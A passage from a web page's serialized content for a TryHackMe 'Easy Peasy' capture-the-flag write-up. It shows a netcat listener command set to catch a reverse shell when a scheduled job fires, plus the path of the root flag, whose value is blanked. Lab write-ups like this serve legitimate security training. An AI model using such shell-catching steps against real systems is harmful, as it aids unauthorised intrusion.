wait for the job to fire."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"bash"}}},{"Text":"nc -lvnp 9000\n"},{"End":{"CodeBlock":{"Fenced":"bash"}}},{"Start":"Paragraph"},{"Text":"The root flag is in a file "},{"Code":"/root/.root.txt"},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":""}}},{"Text":"flag{________________________________}\n"},{"End":{"CodeBlock":{"Fenced":""}}}]}},"__N_SSG":true},"page":"/posts/[path]","query":{"path":"writeups_tryhackme_easy_peasy"},"buildId":"MnC4eJ4ih-P5gsZqaS6Kc","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>